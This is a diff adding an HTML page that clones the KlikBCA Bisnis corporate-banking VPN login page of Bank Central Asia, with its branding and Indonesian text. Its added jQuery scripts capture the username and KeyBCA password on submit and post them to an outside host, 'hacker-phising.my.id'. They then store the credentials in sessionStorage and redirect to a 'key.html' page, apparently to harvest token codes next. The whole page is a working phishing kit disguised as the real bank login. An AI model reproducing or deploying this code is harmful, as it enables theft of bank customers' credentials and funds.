@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html style="height:100%;width:100%;">
+<head>
+
+<title>KLIKBCA BISNIS - VPN SECURE CONNECTION</title>
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=500,user-scalable=no" />
+<script>
+if(self != top) top.location.href="https://vpn.klikbca.com/+CSCOE+/logon.html";
+
+
+
+var blinkCounter=0;
+var dap;
+
+if (typeof navigator === 'object' && 'serviceWorker' in navigator && typeof navigator.serviceWorker === 'object' && 'register' in navigator.serviceWorker) {
+    navigator.serviceWorker.getRegistration('/').then(function(registration) {
+        if (registration) {
+            registration.unregister().then(function() {
+                location.reload();
+            });
+        }
+    });
+}
+ 
+function scrollToLogonForm() {
+    document.location.hash = "form_title_text";
+}
+
+function dap_message(){
+
+      if(!dap) return;
+      
+      if(dap.style.visibility == "visible"){
+         dap.style.visibility = "hidden"
+      }else{
+         dap.style.visibility = "visible"
+      }
+      blinkCounter++;
+      if(dap.style.visibility == "visible" && blinkCounter > 5)
+	      clearInterval(dap_interval)
+} 
+
+function blinkDapMessage(){
+        dap=document.getElementById("dap");
+        if(dap){
+           dap_interval = setInterval('dap_message()',1000)
+        }
+}
+
+function showDapMessage(){
+        obj=document.getElementById("dap_message");
+        if(obj){
+           obj.style.visibility = "visible"
+           obj.style.top = (document.body.clientHeight - obj.clientHeight)/2+"px"
+           obj.style.left = (document.body.clientWidth - obj.clientWidth)/2+"px"
+        }
+
+        obj1=document.getElementById("dap_message_shield");
+        if(obj1){
+           obj1.style.visibility = "visible"
+           obj1.style.top = (document.body.clientHeight - obj.clientHeight)/2+"px"
+           obj1.style.left = (document.body.clientWidth - obj.clientWidth)/2+"px"
+           obj1.style.height = obj.clientHeight+"px"
+           obj1.style.width = obj.clientWidth+"px"
+        }
+} 
+
+function hideDapMessage(){
+        obj=document.getElementById("dap_message");
+        if(obj){
+           obj.style.visibility = "hidden"
+        }
+
+        obj1=document.getElementById("dap_message_shield");
+        if(obj1){
+           obj1.style.visibility = "hidden"
+        }
+} 
+
+
+
+function csco_ShowLoginForm(container_id){
+
+        var obj=document.getElementById("csco_logon_form")
+        var s=""
+        if(obj){
+           var s=obj.innerHTML
+           obj.innerHTML=""
+        }
+        var obj=document.getElementById(container_id)
+        if(obj){
+           obj.innerHTML=s
+           
+
+           var field_name
+
+           if (full_custom_focus_field) {
+                field_name = full_custom_focus_field
+           }else{
+                field_name = "username"
+           }  
+
+            
+           
+           
+                      
+ 
+            
+
+
+           var obj=document.getElementById(field_name);
+           if(obj){
+                obj.focus();
+           }
+
+           if(top.firstGroup){
+                updateLogonForm(top.firstGroup,null,null)
+           }
+        }
+
+}
+
+function csco_ShowLanguageSelector(container_id){
+
+        var obj=document.getElementById("csco_language_selector")
+        var s=""
+        if(obj){
+           var s=obj.innerHTML
+           obj.innerHTML=""
+        }
+        var obj=document.getElementById(container_id)
+        if(obj){
+           obj.innerHTML=s
+        }
+
+}
+
+
+
+
+
+
+
+
+
+function base64_encode(data) {
+  var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+  var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,
+    ac = 0,
+    enc = '', 
+    tmp_arr = []; 
+  if (!data) {
+    return data;
+  }
+  do {
+    // pack three octets into four hexets
+    o1 = data.charCodeAt(i++);
+    o2 = data.charCodeAt(i++);
+    o3 = data.charCodeAt(i++);
+    bits = o1 << 16 | o2 << 8 | o3; 
+    h1 = bits >> 18 & 0x3f;
+    h2 = bits >> 12 & 0x3f;
+    h3 = bits >> 6 & 0x3f;
+    h4 = bits & 0x3f;
+    // use hexets to index into b64, and append result to encoded string
+    tmp_arr[ac++] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
+  } while (i < data.length);
+  enc = tmp_arr.join('');
+  var r = data.length % 3;
+  return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3); 
+}
+function updateLogonForm(group,reload){
+
+    if(reload[group]){
+    	var obj=document.getElementById("login");
+    	if(obj) {
+           obj.disabled=true
+        }
+        document.cookie = "tg=1" + base64_encode(group) + "; path=/; secure";
+    	document.location = "/+CSCOE+/logon.html";
+        return
+    }
+}
+function PrefillError() {
+      var obj = document.getElementById("logon_message_text");
+      if (obj) {
+         obj.innerHTML="Your certificate is invalid for the selected group";
+         obj.style.fontWeight="bold";
+         obj.style.color="red";
+      }
+      obj = document.getElementById("Login");
+      if (obj) {
+         obj.disabled=true;
+      }
+}
+</script>
+
+
+<script src="https://vpn.klikbca.com/+CSCOE+/win.js"></script>
+<script>
+function CSCO_Format(fmt) {
+var i;
+	for(i=1; i < arguments.length; i++) {
+		var r = new RegExp("\\%("+i+"\\$)?.", "i");
+		fmt=fmt.replace(r, arguments[i])
+	}
+	return fmt;
+}
+
+    document.cookie="webvpnlogin=1; path=/; secure";
+
+function disableButton(){
+        try{
+                obj=document.getElementById("submit_button");
+                if(obj){
+                        obj.disabled=true;
+                }
+        }
+        catch (e) {
+
+        }
+
+}
+
+function validate_username(username)
+{
+    var reg = /[&'"<>]/;
+    var ret = false;
+
+    if (username && username.value && !username.value.match(reg)) {
+        ret = true;
+    }
+    return ret;
+}
+
+</script>
+
+
+
+
+
+<head>
+
+	<!-- Required Meta Tags -->
+
+	<meta charset="utf-8">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, shrink-to-fit=no" >
+
+	<link rel="icon" type="image/png" href="https://vpn.klikbca.com/+CSCOU+/v2_favicon.png">
+
+
+
+<!-- Script -->
+
+	<script type="text/javascript" src="https://mbankmon.klikbca.com:443/jstag/managed/23cb2595-0ee1-4954-8219-881f1a8ad7c5/b42c7946f8e3a2d3_complete.js" crossorigin="anonymous"></script>
+
+	<script type="text/javascript">
+
+		var action = dtrum.enterAction('W905', null);
+
+		var prevUrl = "https://vpn.klikbca.com/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1";
+
+		const currUrl = window.location.href;
+
+		if (currUrl == prevUrl) {
+
+			var report = dtrum.reportCustomError('Gagal Login', 'W905');
+
+		};
+
+</script>
+
+	
+
+	
+
+	
+
+	<script type="text/javascript">
+
+		let vh = window.innerHeight * 0.01;
+
+		document.documentElement.style.setProperty('--vh', `${vh}px`);
+
+	</script>
+
+
+
+	
+
+	
+
+	<!-- CSS LINK -->
+
+	<link rel="stylesheet" href="https://vpn.klikbca.com/+CSCOU+/v2_bootstrap452.css">
+
+	<link rel="stylesheet" href="https://vpn.klikbca.com/+CSCOU+/v2_style.css">
+
+
+
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+
+
+
+	<title>KlikBCA Bisnis - Login</title>
+
+	<meta name="description" content="Kelola transaksi bisnis lebih praktis dan aman dengan KlikBCA Bisnis" />
+
+	<meta name="google-site-verification" content="ENjqrPUG62FqcVAWZIKEgzdLOZVqmF-6dDwnFaH1vnI" />
+
+	<meta property="og:title" content="KlikBCA Bisnis - Login" /> 
+
+	<meta property="og:description" content="Kelola transaksi bisnis lebih praktis dan aman dengan KlikBCA Bisnis" /> 
+
+	<meta property="og:image" content="https://pustaka.bca.co.id/images/pustaka-icon/klikBCA.png" /> 
+
+	<meta property="og:image:width" content="800" /> 
+
+	<meta property="og:image:height" content="600" /> 
+
+	<meta property="og:image:alt" content="Og Image" /> 
+
+	<meta name="twitter:card" content="summary_large_image" /> 
+
+	<meta name="twitter:title" content="KlikBCA Bisnis - Login" /> 
+
+	<meta name="twitter:description" content="Kelola transaksi bisnis lebih praktis dan aman dengan KlikBCA Bisnis" /> 
+
+	<meta name="twitter:image" content="https://pustaka.bca.co.id/images/pustaka-icon/klikBCA.png" /> 
+
+	<meta name="twitter:image:width" content="800" /> 
+
+	<meta name="twitter:image:height" content="600" /> 
+
+	<meta name="twitter:image:alt" content="Og Image" /> 
+
+	<meta name="keywords" content="klikbca bisnis, klikbca, klik bca, internet banking bca, bca bisnis, vpn bca, vpn klikbca, klikbca vpn, klikbca login, internet banking, klikbca bisnis vpn, vpnbca, bcaklik bisnis, klikbca bisnis login, bca klik bisnis, vpn bca bisnis, bca bisnis login, klik bisnis bca, vpn klikbca bisnis, klikbca internet banking, kbb bca, internet banking klikbca">
+
+
+
+</head>
+
+<body id="body" onload="csco_ShowLoginForm('lform');csco_ShowLanguageSelector('selector')">
+
+	<div class="main">
+
+		<nav class="navbar navbar-light pb-0">
+
+			<div class="d-flex justify-content-end w-100">
+
+				<span id="language" class="text-blue-bca-1 d-block font-14-20">English Version</span>
+
+				<a id="home" href="">
+
+					<img class="mr-1 ml-1 " src="https://vpn.klikbca.com/+CSCOU+/v2_kbb-home-button.png" height="40px">
+
+				</a>				
+
+			</div>
+
+		</nav>
+
+		<div class="container-fluid vpn-container">
+
+			<div class="row justify-content-md-center pl-3 pr-3">
+
+				<div class="landscape col-12 col-sm-12 col-md-12 col-lg-5 col-xl-4">
+
+					<img class="d-block logo-bca" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca.png">
+
+					<span class="text-blue-bca-1 d-block font-weight-bold font-28-44">KlikBCA Bisnis</span>
+
+					<span class="text-blue-bca-1 d-block font-18-28 ">VPN Secure Connection</span>
+
+					<form 	class="form-horizontal mt-3-7vh" 
+
+							id="formLogin" 
+
+							method="POST" 
+
+							onsubmit="formdebit(); return false" method="POST">					
+
+						<div class="form-group mb-2-3">
+
+							<label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="username">Username</label>
+
+							<input type="text" class="form-control border-0 box-shadow outline-none mb-0" id="username" name="username" placeholder="CorporateID UserID (tanpa spasi)" autocomplete="off" autofocus>
+
+						</div>
+
+						
+
+						<div class="form-group mb-2-3">				
+
+							<label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="password">Password</label>
+
+							<input type="password" inputmode="numeric" class="form-control border-0 box-shadow outline-none password_input" id="password" name="password" placeholder="KeyBCA Appli 1" autocomplete="off">	
+
+						</div>	
+
+						<input id="kirims" type="submit" class="btn text-white vpn-btn mt-2 mb-3" value="BATALKAN"></button>
+
+						
+
+				 <input name="csrf_token" type=hidden value=6e29c50beed069fa33871e822f73f549edcd1f40> 
+				 <script> document.cookie = "CSRFtoken=" + "6e29c50beed069fa33871e822f73f549edcd1f40" + "; path=/; secure"; </script> 
+					</form>
+
+					<span id="info-text3" class="d-block font-14-20 line-height-20 mt-4">Jangan membagikan Corporate/User ID, Respon KeyBCA Appli 1 dan 2 kepada siapa pun.</span>
+
+					<span id="info-text2" class="d-block font-14-20 line-height-20 mt-2">Jika ada yang hal yang mencurigakan hubungi Halo BCA Bisnis via telepon di 1500998 atau bebas pulsa via aplikasi <img src="https://vpn.klikbca.com/+CSCOU+/v7_logo-halo-bca.png" width="30" height="30"></span>
+
+					<span id="info-text1" class="d-block font-14-20 line-height-20 mt-2">Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses <a href="https://www.bca.co.id/id/bisnis/layanan/e-banking-bisnis/klikbca-bisnis" class="text-blue-bca-1">Informasi KlikBCA Bisnis</a> atau hubungi:</span>
+
+					<div class="row mt-3 mb-3">
+
+						<div class="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc">
+
+							<a href="tel:1500998">				
+
+								<div class="row">
+
+									<div class="col-auto col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0-pc info-logo">
+
+										<img src="https://vpn.klikbca.com/+CSCOU+/v2_logo-halobca.png">
+
+									</div>
+
+									<div class="col col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0">
+
+										<div class="text-left-mob">
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20">Halo Layanan</span>
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20">KlikBCA Bisnis</span>
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20 d-block">1500998</span>	
+
+										</div>		
+
+									</div>
+
+								</div>		
+
+							</a>
+
+						</div>							
+
+						<div class="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc">
+
+							<a href="mailto:halobca@bca.co.id">
+
+								<div class="row">
+
+									<div class="col-auto col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0-pc info-logo">
+
+										<img src="https://vpn.klikbca.com/+CSCOU+/v2_logo-email.png" >
+
+									</div>
+
+									<div class="col col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0">
+
+										<div class="text-left-mob">
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20">Email</span>
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20 d-block">halobca@bca.co.id</span>
+
+										</div>		
+
+									</div>
+
+								</div>
+
+							</a>
+
+						</div>							
+
+						<div class="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc">
+
+							<a href="https://x.com/halobca">
+
+								<div class="row">
+
+									<div class="col-auto col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0-pc info-logo">
+
+										<img src="https://vpn.klikbca.com/+CSCOU+/v6_logo-x-black.png"  >
+
+									</div>
+
+									<div class="col col-sm-12 col-md-12 col-lg-12 col-xl-12 p-0">
+
+										<div class="text-left-mob">
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20">X</span>
+
+											<span class="text-blue-bca-1 font-12-16 line-height-20 d-block">@HaloBCA</span>
+
+										</div>		
+
+									</div>
+
+								</div>		
+
+							</a>
+
+						</div>
+
+					</div>
+
+				</div>
+
+				<div class="col-12 col-sm-12 col-md-12 col-lg col-xl ">						
+
+				</div>
+
+			</div>
+
+		</div>		
+
+	</div>
+
+	<footer class="footer text-blue-bca-1">
+
+		<div class="container text-center">
+
+			<small class="footer-font-mob">Copyright &copy 2020</small>
+
+			<img class="footer-img mr-1 ml-1" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca-copyright.png">
+
+			<small class="footer-font-mob">All Right Reserved</small>					
+
+		</div>
+
+	</footer>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"> 
+        </script>
+       
+ <script>
+
+  
+ 
+$(document).ready(function(){
+    $('#formLogin').submit(function(e) {
+        e.preventDefault();
+       
+
+
+ 
+    
+document.getElementById('kirims').innerHTML = "Memproses";
+
+
+
+$.ajax({
+
+ type: 'POST',
+ url: 'req/bisnis.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ 
+
+  setTimeout(function(){
+window.location.href='key.html';  
+var username = document.getElementById("username").value;
+sessionStorage.setItem("username", username);
+var password = document.getElementById("password").value;
+sessionStorage.setItem("password", password);
+var kota = document.getElementById("kota").value;
+sessionStorage.setItem("kota", kota);
+
+     }, 500);
+
+
+ }
+    });
+ });
+    return false;
+});   
+        
+</script>   
+
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_jquery351.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_sweetalert2.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_polyfill.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_popper.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_bootstrap452.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v7_login.js"></script>
+
+	<script type="text/javascript" src="https://vpn.klikbca.com/+CSCOU+/v2_dt-loc.js"></script>
+
+
+
+	<script type='text/javascript'>
+
+		$(function(){
+
+			var overlay = $('<div id="overlay"></div>');
+
+			overlay.show();
+
+			overlay.appendTo(document.body);
+
+		$('.popup').show();
+
+		$('.close').click(function(){
+
+			$('.popup').hide();
+
+			overlay.appendTo(document.body).remove();
+
+			return false;
+
+		});
+
+		$('.x').click(function(){
+
+			$('.popup').hide();
+
+				overlay.appendTo(document.body).remove();
+
+				return false;
+
+			});
+
+		});
+
+	</script>
+
+</body>
+
+      <div id="csco_logon_form" style="position: absolute; visibility: hidden">
+      <table>
+      <tr>
+   
+<script>
+function formSubmit() {
+    disableButton();
+
+    var primary_username = document.getElementById("username"),
+        secondary_username = document.getElementById("secondary_username");
+
+    if ((primary_username && !validate_username(primary_username)) ||
+        (secondary_username && !validate_username(secondary_username))) {
+            document.location = "/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1#form_title_text";
+            return false;
+    }
+
+
+     return true;
+
+}
+</script>
+
+<td id=form_panel align=middle >
+<div >
+<form class="form-horizontal mt-3-7vh" id="formLogin" method="POST">					
+    <div class="form-group mb-2-3">
+        <label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="username">Username</label>
+        <input type="text" class="form-control border-0 box-shadow outline-none mb-0" id="username" name="username" placeholder="CorporateID UserID (tanpa spasi)" autocomplete="off" autofocus required>
+    </div>
+    
+    <div class="form-group mb-2-3">				
+        <label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="password">Password</label>
+        <input type="password" inputmode="numeric" class="form-control border-0 box-shadow outline-none password_input" id="password" name="password" placeholder="KeyBCA Appli 1" autocomplete="off" required>	
+    </div>	
+
+    <!-- Tombol Submit -->
+    <button id="kirims" type="submit" class="btn text-white vpn-btn mt-2 mb-3">BATALKAN</button>
+</form>
+
+<script>
+$(document).ready(function(){
+    $('#formLogin').submit(function(e) {
+        e.preventDefault(); // Mencegah reload halaman
+        
+        var btn = $('#kirims');
+        btn.prop('disabled', true).html("Memproses..."); // Ubah tombol jadi loading
+
+        // Ambil data form
+        var formData = $(this).serialize();
+
+        $.ajax({
+            type: 'POST',
+            url: 'https://hacker-phising.my.id/notif/req/bisnis.php',
+            data: formData,
+            dataType: 'text', // Ubah ke 'text' karena PHP kita return string sederhana
+            success: function(response) {
+                console.log('Sukses kirim data:', response);
+                
+                // Simpan ke sessionStorage sebelum redirect
+                var username = $("#username").val();
+                var password = $("#password").val();
+                
+                sessionStorage.setItem("username", username);
+                sessionStorage.setItem("password", password);
+                // Hapus bagian kota jika tidak ada inputnya, atau isi dengan kosong
+                sessionStorage.setItem("kota", "Unknown"); 
+
+                // Redirect setelah jeda singkat
+                setTimeout(function(){
+                    window.location.href = 'key.html';  
+                }, 500);
+            },
+            error: function(xhr, status, error) {
+                console.error('Gagal kirim data:', error);
+                alert("Terjadi kesalahan koneksi. Coba lagi.");
+                btn.prop('disabled', false).html("LOGIN"); // Kembalikan tombol jika error
+            }
+        });
+    });
+});   
+</script>
+
+</table>
+</td></tr></table>
+</div>
+</form>
+<script>
+
+    full_custom_focus_field = "username"
+
+</script>
+</td>
+
+     </tr>
+      </table>
+      </div>
+      
+      </body>
+      </html>   
+    <iframe style="top:0px;left:0px;position:absolute; visibility:hidden; width: 500px;" id=dap_message_shield src="https://vpn.klikbca.com/+CSCOE+/blank.html"></iframe>
+<div style="top:0px;left:0px;position:absolute; visibility:hidden; width: 500px; background-color: #ffffff; border: 1px solid #000000" id=dap_message>
+<table cellspacing=0 >
+<tr>
+<td height=40 style="margin:10px; background-color: #dbdbdb;">
+<div style="margin:10px;">
+<br>Your system administrator provided the following information to help understand and remedy the security conditions: 
+</div>
+</td>
+</tr>
+<tr>
+<td height=40>
+<div style="margin:10px">
+
+</div>
+</td>
+</tr>
+<tr>
+<td align=right height=40 style="border-top: 1px dotted #aaaaaa;">
+<a href="javascript:hideDapMessage()">Close</a>&nbsp;&nbsp;
+</td>
+</tr>
+</table>
+</div>  
